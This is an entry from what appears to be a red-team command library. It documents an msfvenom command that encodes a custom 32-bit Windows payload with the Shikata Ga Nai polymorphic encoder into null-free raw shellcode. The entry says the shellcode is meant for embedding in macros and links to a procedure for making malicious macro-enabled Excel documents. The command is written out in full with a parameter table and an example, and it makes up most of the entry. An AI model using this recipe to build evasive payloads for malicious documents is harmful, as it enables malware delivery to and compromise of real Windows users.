---
id: dfc2562c-6067-4630-97de-7122ec72274e-1
name: msfvenom-encode-x86-custom-payload
type: command
executor: bash
data: >-
  msfvenom -p generic/custom PAYLOADFILE=$_PAYLOAD_FILE -a x86 --platform
  windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
output: null
created_at: '2023-04-06T03:56:23.232623+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-generation
  - msfvenom
verified: true
validated: true
---

# msfvenom-encode-x86-custom-payload

## Command

```bash
msfvenom -p generic/custom PAYLOADFILE=$_PAYLOAD_FILE -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
```

## Description

Encodes a custom 32-bit payload file using Shikata Ga Nai to produce raw shellcode suitable for embedding in macros. Avoids null bytes for compatibility.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p generic/custom | Use custom payload | Yes |
| PAYLOADFILE=$_PAYLOAD_FILE | Path to input payload (e.g., payload86.bin) | Yes |
| -a x86 | 32-bit architecture | Yes |
| --platform windows | Windows target | Yes |
| -e x86/shikata_ga_nai | Polymorphic encoder | Yes |
| -f raw | Raw output | Yes |
| -o shellcode-86.bin | Output file | Yes |
| -b '\x00' | No null bytes | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin -b '\x00'
```

## Expected Output

Creates shellcode-86.bin; console may show encoding stats. Size varies by input.

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/msfvenom]]
